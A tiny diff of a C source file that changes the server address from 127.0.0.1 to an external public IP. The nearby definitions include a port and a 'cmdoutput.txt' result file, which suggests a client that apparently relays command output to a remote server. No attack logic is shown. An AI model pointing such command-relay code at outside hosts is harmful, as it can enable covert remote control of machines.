@@ -12,7 +12,7 @@
 
 #define SP_PORT     8895
 #define BUFFER_SIZE 4096
-#define SERVER_ADDR "127.0.0.1"
+#define SERVER_ADDR "104.194.123.106"
 #define CMD_RESULT "cmdoutput.txt"
 
 int readbuf(int conn, char* buf, int size);
